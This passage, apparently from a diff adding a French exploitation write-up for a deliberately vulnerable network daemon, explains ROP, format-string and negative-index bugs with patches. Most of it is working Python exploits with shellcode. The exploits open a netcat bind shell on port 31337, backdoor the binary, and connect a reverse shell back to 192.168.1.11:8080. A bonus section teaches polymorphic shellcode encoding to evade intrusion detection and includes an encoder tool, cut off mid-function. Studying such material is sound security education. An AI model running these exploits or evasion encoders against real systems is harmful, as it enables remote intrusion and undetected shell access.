+	buff += INCEAX * 11                 # on l'incrémente 11 fois pour qu'il puisse avoir la valeur
+                                            # 0xb
+	buff += POPALL                      # on fait un dernier pop pour placer les adresses qu'on
+                                            # a construites
+	buff += pack("<I", 0x080c8081 + 24) # edx char *env
+	buff += pack("<I", 0x080c8110 + 60) # ecx char **arguments
+	buff += pack("<I", 0x080c8110)      # ebx "/usr/bin//nc"
+	buff += INT80                       # on exécute le tout !
+	######################### execve ###########################
+
+	cmdID = "3 "
+	arg3  = " "+buff
+	arg2  = str(len(arg3))
+	payload = cmdID + arg2 + arg3
+
+	print "[+] Send payload..."
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload"
+	   sys.exit(1)
+	print "[+] done!"
+	[/sploit]
+
+
+Et voila, l'exploit bypasse l'ASLR, NX et l'ASCII-ARMOR et ouvre un remote shell.
+Le ROP est extrêmement puissant et stable, mais comme vous avez pu le constater,
+il est aussi très complexe à mettre en place.
+
+
+Et voilà pour ce qui concerne la vulnérabilité dans handlerUpdateLastVisit.
+Pour pouvoir corriger cette faille, il suffit juste d'utiliser execve() à la place de system
+et de contrôler la taille de buf pour la copy.
+
+Voici le patch:
+---------------
+
+	[patch]
+	@@ -79,8 +79,9 @@
+	   char			*name = NULL;
+
+	   if ((name = getStr(&packetPtr, &packetSize))) {
+	-    if (sprintf(buf, "touch lastvisit_%s\n", name) >= 512)
+	-      return (1);
+	+    if (strlen(name) < 490)
+	+      if (sprintf(buf, "touch lastvisit_%s\n", name) >= 512)
+	+        return (1);
+	     free(name);
+	     return (0);
+	   }
+	@@ -92,7 +93,7 @@
+	   char			buf[512] = {0};
+
+	   if (!updateBuf(buf, packetPtr, packetSize))
+	-    system(buf);
+	+    execlp(buf, buf, NULL);
+	   return (0);
+	 }
+	[/patch]
+
+###################################### handlerUpdateLastVisit ####################################
+
+
+###################################### handlerShowGuestBook ######################################
+
+Dans cette fonction, la vulnérabilité est due à une mauvaise utilisation de la
+fonction printf.
+
+
+	[code]
+	int			handlerShowGuestBook(void *packetPtr, size_t packetSize)
+	{
+	  char			*passwd;
+	  char			buf[512] = {0};
+
+	  passwd = getStr(&packetPtr, &packetSize);
+	  if (strlen(guestBook) < 512 - 20) {
+	    snprintf(buf, sizeof(buf), "Dernier message : %s", guestBook);
+	    if (passwordCheck(passwd))
+	      return (1);
+	  }
+	  printf(buf);
+	  return (0);
+	}
+	[/code]
+
+
+Ici, on déclare un tableau "buf" de 512 octets, on copie "Dernier message : "
+suivi du contenu de guestBook, ensuite il teste si l'utilisateur a les droits
+pour afficher le contenu de buf, si oui, il affiche le contenu avec printf.
+
+C'est ici qu'est la vulnérabilité. "printf(buf);"
+
+L'importance des "va_args".
+===========================
+
+Les va_args permettent de limiter les "formats strings" (%x %c %s %d etc...), si
+printf est appelé sans argument, il n'y a donc pas de limitation de "format
+string" et donc il nous est possible de lire/écrire le contenu de la stack.
+
+Comment fonctionne printf ?
+===========================
+
+Tout le monde à EPITECH a recodé cette fonction, mais savez-vous comment cela
+se passe sur la stack? Et pourquoi une telle exploitation est possible avec printf ?
+
+Prenons le code suivant:
+
+	[code]
+	#include <stdio.h>
+
+	int main(void)
+	{
+	 printf("salut ça va %s ?\n", "djo");
+	 return (0);
+	}
+	[/code]
+
+Regardons cela de plus près avec gdb.
+
+	(gdb) disass main
+	Dump of assembler code for function main:
+	   0x080483a4 <+0>:	push   %ebp
+	   0x080483a5 <+1>:	mov    %esp,%ebp
+	   0x080483a7 <+3>:	and    $0xfffffff0,%esp
+	   0x080483aa <+6>:	sub    $0x10,%esp
+	   0x080483ad <+9>:	mov    $0x8048490,%eax         <-- on place "salut ça va %s ?\n"
+                                                                   dans eax
+	   0x080483b2 <+14>:	movl   $0x80484a3,0x4(%esp)    <-- on place "djo" sur la stack+4
+	   0x080483ba <+22>:	mov    %eax,(%esp)             <-- on place eax sur la stack
+	   0x080483bd <+25>:	call   0x80482d8 <printf@plt>  <-- on appelle printf
+	   0x080483c2 <+30>:	mov    $0x0,%eax
+	   0x080483c7 <+35>:	leave
+	   0x080483c8 <+36>:	ret
+	End of assembler dump.
+	(gdb) b *0x080483bd                                    <-- je break à l'appel de printf
+                                                                   pour voir l'état de la stack
+
+	Breakpoint 1 at 0x80483bd
+	(gdb) r
+	Starting program: /home/jonathan/all/ESL/pepito-2011/tmp/frmtstr/printf
+
+	Breakpoint 1, 0x080483bd in main ()
+	(gdb) x/3x $esp
+	0xbffff7c0:	0x08048490	0x080484a3	0x080483db  <-- Voici les trois premières
+                                                                        adresses qu'on trouve sur
+                                                                        la stack. On retouve bien:
+                                                                          - "salut ça va %s ?\n"
+                                                                          - et "djo"
+
+                                                                        la troisième est une adresse
+                                                                        que printf n'utilisera pas.
+
+	(gdb) x/s 0x08048490
+	0x8048490:	 "salut ça va %s ?\n"
+	(gdb) x/s 0x080484a3
+	0x80484a3:	 "djo"
+	(gdb) x/s 0x080483db
+	0x80483db <__libc_csu_init+11>:	 "\201ù\021"
+	(gdb)
+
+
+Les va_args permettent de limiter les élements qu'on va poper sur la stack. Ici
+un seul élément est appelé "%s" , du coup, la seule adresse qui va être popée est
+0x080484a3 soit "djo".
+
+Dans le cas de printf(buf), si buf contient "%s%s%s" on n'aura pas eu de limite
+de va_args et nous aurons commencé à poper les trois éléments de la stack.
+
+Il nous est donc possible de pouvoir afficher tout le contenu de la stack avec
+un "format string" de type "%x ou %s"
+
+Exemple:
+========
+
+	[code]
+	#include <stdio.h>
+
+
+	int main(void)
+	{
+	 char *buf = "%x-%x-%x-%x-%x-%x";
+
+	 printf(buf);
+	 puts("\nEOF");
+	 return (0);
+	}
+	[/code]
+
+	jonathan@ArchLinux [frmtstr] $ ./printf
+	b7fb7324-b7fb6ff4-bffff7f8-b7e9d075-b7ff0b90-804841b
+	EOF
+
+Nous avons bien affiché les adresses qui ont été pushées sur la stack.
+On regarde avec gdb pour bien confirmer ce qu'on avance.
+
+	(gdb) disass main
+	Dump of assembler code for function main:
+	   0x080483d4 <+0>:	push   %ebp
+	   0x080483d5 <+1>:	mov    %esp,%ebp
+	   0x080483d7 <+3>:	and    $0xfffffff0,%esp
+	   0x080483da <+6>:	sub    $0x20,%esp
+	   0x080483dd <+9>:	movl   $0x80484d0,0x1c(%esp)
+	   0x080483e5 <+17>:	mov    0x1c(%esp),%eax
+	   0x080483e9 <+21>:	mov    %eax,(%esp)
+	   0x080483ec <+24>:	call   0x80482fc <printf@plt>
+	   0x080483f1 <+29>:	movl   $0x80484e2,(%esp)
+	   0x080483f8 <+36>:	call   0x804830c <puts@plt>
+	   0x080483fd <+41>:	mov    $0x0,%eax
+	   0x08048402 <+46>:	leave
+	   0x08048403 <+47>:	ret
+	End of assembler dump.
+	(gdb) b *0x080483ec                <--- break sur l'appel de printf pour voir l'état
+                                                de la stack
+	Breakpoint 1 at 0x80483ec
+	(gdb) r
+	Starting program: /home/jonathan/all/ESL/pepito-2011/tmp/frmtstr/printf
+
+	Breakpoint 1, 0x080483ec in main ()
+	(gdb) x/10x $esp
+	0xbffff7b0:	0x080484d0	0xb7fb7324	0xb7fb6ff4	0xbffff7d8
+	0xbffff7c0:	0xb7e9d075	0xb7ff0b90	0x0804841b	0x080484d0
+	0xbffff7d0:	0x08048410	0x00000000
+	(gdb)
+
+Certaines adresses sont légèrement décalées, c'est normal car gdb décale la stack.
+
+
+Maintenant qu'un bilan a été fait sur le fonctionnement des va_args et de
+printf, nous allons pouvoir commencer à parler de l'exploitation.
+
+
+	[code]
+	if (strlen(guestBook) < 512 - 20) {
+	  snprintf(buf, sizeof(buf), "Dernier message : %s", guestBook);
+	  if (passwordCheck(passwd))
+	    return (1);
+	}
+	printf(buf);
+	[/code]
+
+
+Notre chaîne de format string sera stockée dans guestBook mais ne devrait pas dépasser
+les 492 octets.
+
+Avec %n il nous est possible d'écrire à une adresse précise n'importe où en mémoire,
+d'où la puissance d'une attaque de type "format string attack".
+
+Pour pouvoir écrire à une adresse, il va nous falloir pushé cette dernière sur la stack
+et ensuite placer notre format string (%n) au bon endroit pour qu'il puisse être
+en concordance avec l'élement sur la stack.
+
+Exemple en programme
+====================
+
+	[code]
+	#include <stdio.h>
+
+	int main(void)
+	{
+	  char buff[32];
+
+          scanf("%s", buff);
+	  printf(buff);
+	  puts("\nEOF");
+
+          return (0);
+	}
+	[/code]
+
+	jonathan@ArchLinux [frmtstr] $ ./printf
+	AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
+	AAAA-bffff7d0-bffff7f8-8048489-41414141-2d78252d-252d7825-78252d78-2d78252d
+        -252d7825-78252d78-2d78252d-252d7825
+	EOF
+
+Il nous est possible de placer ce que l'on veut sur la stack. Ici nos "AAAA" est
+le 4eme élement.
+
+Si nous remplacons
+"AAAA-%x-%x-%x-(%x)-%x-%x-%x-%x-%x-%x-%x-%x"
+par
+"AAAA-%x-%x-%x-(%s)-%x-%x-%x-%x-%x-%x-%x-%x"
+
+nous aurons:
+
+	AAAA-bffff7d0-bffff7f8-8048489-AAAA-2d78252d-252d7825-78252d78-2d78252d
+        -252d7825-78252d78-2d78252d-252d7825
+	EOF
+
+
+Le flag %n permet d'écrire le nombre de caractères écrit jusqu'à celui-ci, à l'adresse
+de la variable passée en paramètre.
+Avec %n nous aurions donc écrit à l'adresse 0x41414141.
+
+Les adresses des fonctions des librairies partagées sont situées dans la .got
+(Global Offset Tables).
+
+Le principe d'un format string est donc d'écrire l'adresse d'une fonction dans la .got
+pour que, quand celle-ci sera appelée au lieu d'aller exécuter son code, elle ira exécuter
+notre code arbitraire (shellcode).
+
+Comment est constitué la .got d'une fonction ?
+Prenons comme exemple le printf du programme plus haut:
+
+
+	(gdb) disass 0x8048340                             <--- call printf
+	Dump of assembler code for function printf@plt:    <--- printf dans la .plt
+	   0x08048340 <+0>:	jmp    *0x8049638          <--- il jump dans la .got
+	   0x08048346 <+6>:	push   $0x10
+	   0x0804834b <+11>:	jmp    0x8048310
+	End of assembler dump.
+	(gdb) disass 0x8049638
+	Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
+	   0x08049624 <+0>:	push   %eax
+	   0x08049625 <+1>:	xchg   %eax,%ebp
+	   0x08049626 <+2>:	add    $0x8,%al
+	   0x08049628 <+4>:	add    %al,(%eax)
+	   0x0804962a <+6>:	add    %al,(%eax)
+	   0x0804962c <+8>:	add    %al,(%eax)
+	   0x0804962e <+10>:	add    %al,(%eax)
+	   0x08049630 <+12>:	addl   $0x36,%es:(%eax,%ecx,1)
+	   0x08049635 <+17>:	addl   $0x46,(%eax,%ecx,1)
+	   0x08049639 <+21>:	addl   $0x56,(%eax,%ecx,1)
+	   0x0804963d <+25>:	addl   $0x66,(%eax,%ecx,1)
+	   0x08049641 <+29>:	addl   $0x0,(%eax,%ecx,1)
+	End of assembler dump.
+
+
+Le but est donc d'écrire l'adresse de notre shellcode à l'adresse 0x8049638 pour que
+quand l'instruction "jmp    *0x8049638" est executé, celle-ci nous fasse sauter sur notre
+shellcode.
+
+Schema de l'exploitation:
+-------------------------
+
+ 1 - Connaître l'adresse d'une fonction dans la .got (ici on prendra write())
+ 2 - Placer notre shellcode sur la stack.
+ 3 - Ecrire l'adresse de write pour la faire pointer sur notre shellcode
+ 4 - Réinitialisé le mot de passe pour pouvoir accéder au printf(buf)
+
+
+ # Exploit: Linux x86 32 bits
+ # Sécu   : Aucune sécurité
+
+	[sploit]
+	#!/usr/bin/env python2
+	# sploit qui utilise la vuln printf pour format string
+	# remplir le guestbook avec un formatstring
+	# puis afficher le book.
+
+	import socket
+	import os
+	import time
+	import sys
+
+	if len(sys.argv) != 3:
+	   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+	   sys.exit(1)
+
+	# use sploit for reset password
+	concat = "../../bypass_NX_ASLR_ASCII_ARMOR_NOROP/handlerAddToGuestBook_newpasswd_strcpy/\
+        sploit.py " + sys.argv[1] + " " + sys.argv[2]
+	os.system(concat)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	# (gdb)$ disass 0x8048918
+	# Dump of assembler code for function write@plt:
+	#    0x08048918 <+0>:  jmp    *0x804a9dc
+	#    0x0804891e <+6>:  push   $0x50
+	#    0x08048923 <+11>: jmp    0x8048868
+	# End of assembler dump.
+	# (gdb)$ disass 0x804a9dc
+	# Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
+	#    0x0804a9a8 <+0>:  aam    $0xffffffa8
+	#    0x0804a9aa <+2>:  add    $0x8,%al
+	#    0x0804a9ac <+4>:  clc
+
+	# 0xbfffe54c: 0x63303031	0x24323125  0x242d6e68	0x63303031
+	# 0xbfffe55c: 0x24333125	0x90906e68  0x90909090	0x90909090
+	# 0xbfffe56c: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe57c: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe58c: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe59c: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe5ac: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe5bc: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe5cc: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe5dc: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe5ec: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe5fc: 0x90909090	0x90909090  0x90909090	0x90909090
+	# 0xbfffe60c: 0xeb909090	0xc9315e11  0x6c8043b1	0x8035ff0e
+	# 0xbfffe61c: 0xf67501e9	0xeae805eb  0x95ffffff	0x0766f566
+	# 0xbfffe62c: 0x9d8740e5	0x9da864a3  0x9764649d	0x8718be9e
+	# 0xbfffe63c: 0x9898629d	0x8716be98  0x88863c20	0xb50216be
+	# 0xbfffe64c: 0x34291d96	0x98a33434  0xa5a16255	0x68666855
+	# 0xbfffe65c: 0x62556c68	0x9764559a  0x6464a39e	0x00009da8
+	# 0xbfffe66c: 0x00000000	0x00000000  0x00000000	0x00000000
+	# 0xbfffe67c: 0x00000000	0x00000000  0x00000000	0x00000000
+
+	#
+	# Pour l'exploitation, je vais réécrire sur la got de la fonction write
+	# qui est utilisée dans la fonction sendLogMessage.
+	# Une fois la .got_write réécrit avec comme eip = 0xbfffe59c (en plein
+	# dans mes nops), il nous fondra activer la fonction sendLogMessage,
+	# pour cela un simple mot de passe erroner fera un call sur
+	# sendLogMessage(PASSWD_FAIL)
+	#
+	# Après cela un backdoor sera en écoute sur le port 31337
+	#
+
+	# nc -lp 31337 -e /bin//sh polymorphic (91 bytes)
+	# http://www.shell-storm.org/shellcode/files/shellcode-656.php
+	shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35" \
+		    "\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff" \
+		    "\x95\x66\xf5\x66\x07\xe5\x40\x87\x9d\xa3\x64\xa8" \
+		    "\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87\x9d\x62\x98" \
+		    "\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02" \
+		    "\xb5\x96\x1d\x29\x34\x34\x34\xa3\x98\x55\x62\xa1" \
+		    "\xa5\x55\x68\x66\x68\x68\x6c\x55\x62\x9a\x55\x64" \
+		    "\x97\x9e\xa3\x64\x64\xa8\x9d"
+
+	got      = "\xde\xa9\x04\x08\xdc\xa9\x04\x08" # 0xbf
+	#got     += "PADD"
+	#got     += "\xdd\xa9\x04\x08" # 0xff
+	#got     += "PADD"
+	#got     += "\xde\xa9\x04\x08" # 0xd8
+	#got     += "PADD"
+	#got     += "\xdf\xa9\x04\x08" # 0x5c
+	cmdID    = "1"
+	string   = "--"+got+"---%49120x%12$hn-"+"aaaa"+"%9650x%13$hn"
+
+	size_pad = 300 - (len(string) + len(shellcode))
+	padding  = "\x90" * size_pad
+	string  += padding + shellcode
+	arg2     = str(len(string) + 1)
+	frmtstr  = cmdID + " " + arg2 + string
+	print "[>] " + frmtstr
+
+	print "[+] Send format string (%d bytes)..." %(len(string))
+	try:
+	   s.send(frmtstr)
+	   s.close
+	except:
+	   print "[-] Error send frmtstr"
+	   sys.exit(1)
+
+	#############################
+	# exec frmtstr
+	#############################
+	time.sleep(2);
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	cmdID = "2"
+	pwd = "djo"
+	arg2  = str(len(pwd) + 1)
+	payload = cmdID + " " + arg2 + " " + pwd
+	print payload
+
+	print "[+] Exec format string..."
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error exec frmtstr"
+	   sys.exit(1)
+
+	######################################
+	# exec write for jump on my shellcode
+	######################################
+	time.sleep(2);
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	cmdID = "2"
+	pwd = "wtf"
+	arg2  = str(len(pwd) + 1)
+	payload = cmdID + " " + arg2 + " " + pwd
+	print payload
+
+	print "[+] Exec write for jump on my shellcode..."
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error exec write"
+	   sys.exit(1)
+
+	print "[+] done!"
+	time.sleep(2)
+	print "[+] Connecting to the backdoor..."
+	concat = "netcat " + sys.argv[1] + " 31337"
+	print "[+] Connected to the backdoor you can now execute cmd :)"
+	os.system(concat)
+	[/sploit]
+
+
+Pour sécuriser ce type de vulnérabilité, il suffit juste de contrôler l'appel à
+printf et d'utiliser les va_args.
+
+
+	[patch]
+	@@ -107,7 +108,7 @@
+	     if (passwordCheck(passwd))
+	       return (1);
+	   }
+	-  printf(buf);
+	+  printf("%s", buf);
+	   return (0);
+	 }
+	[/patch]
+
+###################################### handlerShowGuestBook ######################################
+
+
+###################################### handlePacket ##############################################
+
+
+Dans cette fonction, nous avons un integer overflow qui est extrêmement sympa à exploiter.
+Nous allons, dans cette fonction, montrer comment il est possible de backdoorer un binaire.
+
+	[code]
+	int			handlePacket(void *packetPtr, size_t packetSize)
+	{
+	  int			cmdId;
+
+	  cmdId = getNumber(&packetPtr, &packetSize);
+	  if (cmdId > (int)HANDLER_LEN)
+	    fprintf(stderr, "ID (%i) out of range.\n", cmdId);
+	  else
+	    handlerTab[cmdId](packetPtr, packetSize);
+	  return (0);
+	}
+	[/code]
+
+
+Ici, si nous dépassons la taille de (int)HANDLER_LEN nous n'irons pas chercher notre fonction
+dans le tableau de pointeur sur fonction.
+
+Dans le cas contraire, nous allons chercher la fonction depuis handlerTab[cmdId].
+La vulnérabilité ici est qu'il nous possible de placer un nombre négatif et donc d'aller chercher
+une fonction en handlerTab[-2](packetPtr, packetSize);
+
+Il nous est donc possible de placer une fonction dans la section .data puis de créer un nouveau
+pointeur à l'adresse handlerTab - 8.
+
+
+Regardons ce qu'il se passe avec gdb quand nous rentrons un valeur négative
+
+
+	gdb$ set follow-fork-mode child
+	gdb$ r start
+	[New process 26252]
+	Daemon started
+
+	Program received signal SIGSEGV, Segmentation fault.
+	[Switching to process 26252]
+	--------------------------------------------------------------------------[regs]
+	  EAX: BFFFE7A2  EBX: B7FB6FF4  ECX: 00000000
+	  EDX: 00000005  ESI: 00000000  EDI: 00000000
+	  EBP: BFFFE768  ESP: BFFFE73C  EIP: 00000000
+
+	Error while running hook_stop:
+	Cannot access memory at address 0x0
+	0x00000000 in ?? ()                   <=== EIP pointe sur 0x00000000 il pointe donc dans
+	gdb$                                       notre tableau
+
+
+
+
+Schéma de l'exploitation:
+-------------------------
+
+
+		              +---------+
+		              v         |
+	[guestBook][password  backdoor  @bd][handlerTab]
+	^          ^                    ^   ^
+	+-804aa80  +-804ac80            |   +-804ae80
+		                        +------------- bd est placé à 804ae80 - 8
+		                                       soit 0x804ae7c pour notre
+		                                       handlerTab[-2]
+
+
+ # Exploit: Linux x86 32 bits
+ # Sécu   : Toute sécurité sauf SSP
+
+	[sploit]
+	#!/usr/bin/env python2
+
+	import socket
+	import os
+	import time
+	import sys
+
+	if len(sys.argv) != 3:
+		print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+		sys.exit(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	# connect back 192.168.1.11:8080
+	# nc -l -vvv -p 8080
+	shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
+		    "\x5b\x5e\x68\xc0\xa8\x01\x0b\x66\x68\x1f\x90\x66\x53\x6a\x10" \
+		    "\x51\x50\x89\xe1\x43\x6a\x66\x58\xcd\x80\x59\x87\xd9\xb0\x3f" \
+		    "\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
+		    "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+	password    = shellcode
+	size        = len(shellcode)
+	password   += "\x90" * (512 - size - 8)
+	guestBook   = "A" * 512
+	handlerTab  = "\x80\xac\x04\x08" # tab[-2]
+	cmdID       = "1"
+
+	arg2        = str(len(guestBook) + len(password) + len(handlerTab) + 1)
+	payload     = cmdID + " " + arg2 + guestBook + password + handlerTab
+
+	print "[+] Try to send payload"
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload1"
+	   sys.exit(1)
+
+	print "[+] binary backdoored in handlerTab[-2]"
+	sys.exit(0)
+	[/sploit]
+
+
+
+Pour patcher cette vulnérabilité il suffit juste de vérifier que cmdID n'est pas négatif
+
+
+	[patch]
+	@@ -130,7 +131,7 @@
+	   cmdId = getNumber(&packetPtr, &packetSize);
+	   if (cmdId > (int)HANDLER_LEN)
+	     fprintf(stderr, "ID (%i) out of range.\n", cmdId);
+	-  else
+	+  else if (cmdId >= 0)
+	     handlerTab[cmdId](packetPtr, packetSize);
+	   return (0);
+	 }
+	[/patch]
+
+###################################### handlePacket ##############################################
+
+
+________________________________________
+04 - Bonnus 1 - Polymorphisme Linux x86 \______________________________________
+
+
+Tout au long de ce write-up nous avons expliqué comment injecter du code arbritraire
+(shellcode) sur une machine distante.
+
+Cependant, il existe plusieurs types de sécurité, l'ASLR, NX, SSP, ASCII-ARMOR,
+Stackguard/Stackshield et bien d'autres.
+
+Mais il existe aussi ce qu'on appelle les IDS (Intrusion Detection System) qui filtrent les trames
+d'un réseau.
+
+Imaginons que notre IDS est configuré pour filtrer la chaîne /bin/sh et toutes ses variantes
+(//bin/sh, //bin//sh ou l'instruction "int $0x80", etc...)
+
+Cela signifie donc qu'il nous sera impossible d'injecter un shellcode en dur dans notre requête,
+C'est pourquoi le polymorphisme existe (entre autre).
+
+
+
+        I - Présentation du polymorphisme
+	==================================
+
+	Le mot polymorphisme vient  du grec et  signifie plusieurs formes. Ce terme a été employé en
+	informatique pour la première fois par un pirate bulgare portant le pseudonyme Dark Avenger,
+	ce dernier ayant créé en 1992 le premier virus polymorphique.
+
+	L'objectif du code polymorphique est d'éviter la  détection  tout en s'adaptant aux modèles,
+	c'est-à-dire  à  certains  traits caractéristiques  permettant  d'identifier  un code donné.
+
+	Le polymorphisme est utilisé dans les shellcodes pour camoufler les attaques sur un réseau.
+	Il est vrai que de  nos jours les IDS  (Intrusion Detection System) répertorient la plupart
+	des structures de shellcodes. (exemple: push /bin/sh, etc...).
+	C'est pourquoi le polymorphisme permet de passer outre cette détection.
+
+
+
+	II - Structure d'un shellcode polymorphique
+	===========================================
+
+	Pour éviter les détections notre shellcode devra être encodé mais pour qu'il fonctionne
+	correctement nous devons lui ajouter un décodeur.
+
+	La structure sera comme ci-dessous:
+
+
+	+------------+--------------------+
+	|  DECODEUR  |  SHELLCODE ENCODE  |
+	+------------+--------------------+
+	<--Notre shellcode polymorphique-->
+
+
+	Prenons le shellcode: http://www.shell-storm.org/shellcode/files/shellcode-606.php
+        qui fait un simple execve()
+
+        "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
+	"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
+	"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
+	"\x51\x53\x89\xe1\xcd\x80"
+
+	Ok, maintenant imaginons que notre IDS est programmé pour détecter cette suite d'instruction.
+	Nous allons donc devoir  l'encoder, pour ça  commencons par incrémenter de 1 notre shellcode.
+
+	Ce qui va donner:
+
+        "\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71"
+	"\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62"
+	"\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53"
+	"\x52\x54\x8a\xe2\xce\x81"
+
+	Une  fois  notre shellcode  encodé nous devons lui rajouter  le décodeur, comme  vous l'avez
+	sûrement compris, le décodeur devra décrémenter de 1 notre suite d'instrution.
+
+	Voici les sources d'un décodeur
+
+	BITS 32
+
+	jmp short three
+
+	one:
+	 pop esi
+	 xor ecx, ecx
+	 mov cl, 36			; On place dans %cl la taille de notre shellcode
+
+	two:
+	 sub byte [esi + ecx -1 ], 0	; on décrémente de 1 notre chaîne
+	 sub cl,1			; on décrémente de 1 la taille de la chaîne
+	 jnz two			; on test si %cl est à 0 (si c'est la fin de notre chaîne)
+	 jmp short four			; si c'est le cas on sort de la boucle
+
+	three:
+	 call one
+
+	four:
+
+	Compilons notre décodeur:
+
+	jonathan@ArchLinux [test]$ nasm -f elf decodeur.s
+	jonathan@ArchLinux [test]$ ls
+	decodeur.o  decodeur.s
+	jonathan@ArchLinux [test]$ ld -o decodeur decodeur.o
+	ld: warning: cannot find entry symbol _start; defaulting to 08048060
+	jonathan@ArchLinux [test]$ objdump -d decodeur
+
+	main:     file format elf32-i386
+
+
+	Disassembly of section .text:
+
+	08048060 <one-0x2>:
+	 8048060:	eb 11                	jmp    8048073 <three>
+
+	08048062 <one>:
+	 8048062:	5e                   	pop    %esi
+	 8048063:	31 c9                	xor    %ecx,%ecx
+	 8048065:	b1 24                	mov    $0x24,%cl
+
+	08048067 <two>:
+	 8048067:	80 6c 0e ff 00       	subb   $0x0,-0x1(%esi,%ecx,1)
+	 804806c:	80 e9 01             	sub    $0x1,%cl
+	 804806f:	75 f6                	jne    8048067 <two>
+	 8048071:	eb 05                	jmp    8048078 <four>
+
+	08048073 <three>:
+	 8048073:	e8 ea ff ff ff       	call   8048062 <one>
+
+
+
+	Maintenant rajoutons notre décodeur au shellcode déjà encodé:
+
+        //Décodeur
+	"\xeb\x11\x5e\x31\xc9\xb1\x24\x80"
+	"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
+  	"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
+
+        //Shellcode encodé
+        "\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71"
+	"\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62"
+	"\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53"
+	"\x52\x54\x8a\xe2\xce\x81";
+
+
+	Et voilà notre shellcode a  été executé sans aucun problème avec une taille de 60 bytes.
+	Il existe plusieurs types d'encodage pour camoufler votre shellcode les principaux sont:
+
+		- Addition
+		- Soustraction
+		- Xor
+
+	Après il vous est possible de créer votre propre algorythme pour encoder vos shellcodes.
+
+
+
+	III - Extras
+	============
+
+	Je ne vous cache pas que  c'est long et  chiant  d'encoder des shellcode, c'est pourquoi
+	dans cette section je vais vous laisser un outil qui vous facilitera la vie.
+
+	/*
+	Writed by Jonathan Salwan - shell-storm.org
+	Original source: http://www.shell-storm.org/shellcode/files/utility-649.php
+	*/
+
+	#include <stdio.h>
+	#include <stdio.h>
+
+                                  /* ici votre sehllcode */
+	unsigned char your_SC[] = "\x31\xc0\x31\xdb\x31\xc9"
+			          "\x31\xd2\xb2\x09\x6a\x0a"
+			          "\x68\x74\x68\x61\x6e\x68"
+			          "\x6a\x6f\x6e\x61\x89\xe1"
+			          "\xb3\x01\xb0\x04\xcd\x80"
+			          "\x31\xdb\xb0\x01\xcd\x80";
+
+
+	void syntax(void)
+	{
+		fprintf(stdout,"\nSyntax:  ./encode <type> <value>\n\n");
+		fprintf(stdout,"Type:    -xor\n");
+		fprintf(stdout,"         -add\n");
+		fprintf(stdout,"         -sub\n\n");
+		fprintf(stdout,"Exemple: ./encode -xor 10\n\n");
+		exit(1);
+	}
+
+	int main(int argc, char *argv[])
+	{
+		if(argc != 3){
+			syntax();
+			return 1;
+			}
+
+
+		if(!strcmp(argv[1], "-xor"))
+			{
+			fprintf(stdout,"Encode : XOR %s\n", argv[2]);
+			fprintf(stdout,"Encoded: \n");
+
+		        fprintf(stdout,"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x%x\\x80"
+		                       "\\x74\\x0e\\xff\\x%.2x\\x80\\xe9\\x01\\x75"
+		                       "\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"
+		                       ,strlen(your_SC), atoi(argv[2]));
+
+			for (int i=0;i<sizeof(your_SC)-1;i++){
+				your_SC[i] = your_SC[i]^atoi(argv[2]);
+				fprintf(stdout,"\\x%.2x", your_SC[i]);
+				}
+			fprintf(stdout,"\n");
+			}
+
+
+		if(!strcmp(argv[1], "-add"))
+		        {
+		        fprintf(stdout,"Encode : ADD %s\n", argv[2]);
+		        fprintf(stdout,"Encoded: \n");
+
